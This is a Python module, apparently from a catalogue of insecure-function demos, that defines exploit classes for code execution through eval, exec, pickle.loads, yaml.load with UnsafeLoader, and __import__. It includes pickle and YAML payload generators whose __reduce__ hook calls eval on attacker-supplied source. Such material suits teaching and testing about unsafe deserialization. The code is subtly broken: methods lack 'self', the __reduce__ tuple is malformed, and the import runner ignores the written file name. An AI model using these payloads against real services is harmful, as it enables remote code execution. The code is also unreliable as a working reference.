import builtins
import pickle
import subprocess
from typing import Callable
from pathlib import Path

import yaml

from .code_execution import Exploit


class PythonExploit(Exploit):
    category_name = "Python Code Execution"

    def generate_payload(source_code: str) -> str:
        return source_code


class EvalExploit(PythonExploit):
    vulnerable_function = builtins.eval

    def run_payload(payload: str) -> None:
        eval(payload)


class ExecExploit(PythonExploit):
    vulnerable_function = builtins.exec

    def run_payload(payload: str) -> None:
        exec(payload)


class PickleLoadsExploit(PythonExploit):
    vulnerable_function = pickle.loads
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, source_code)

        return pickle.dumps(Exploit())

    def run_payload(payload: str) -> None:
        pickle.loads(payload)


class YamlLoadsExploit(PythonExploit):
    vulnerable_function = yaml.load
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )
    notes = (
        "'load' without an explicit loader has been deperecated since 2020, "
        + "and now requires 'UnsafeLoader' for the exploit to work: "
        + "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, source_code)

        return yaml.dump(Exploit())

    def run_payload(payload: str) -> None:
        yaml.load(payload, Loader=yaml.UnsafeLoader)


class ImportExploit(PythonExploit):
    vulnerable_function = builtins.__import__ # Used by the 'import' keyword

    def run_payload(payload: str, file_name: str) -> None:
        # Prevent path traversal
        if ".." in file_name or "/" in file_name:
            raise Exception("Path traversal attempt")

        file_path = Path.cwd() / file_name


        if file_path.exists():
            raise Exception("File overwrite attempt")

        file_path.write_text(payload)

        from . import helper

        # Clean up temp file
        file_path.unlink()
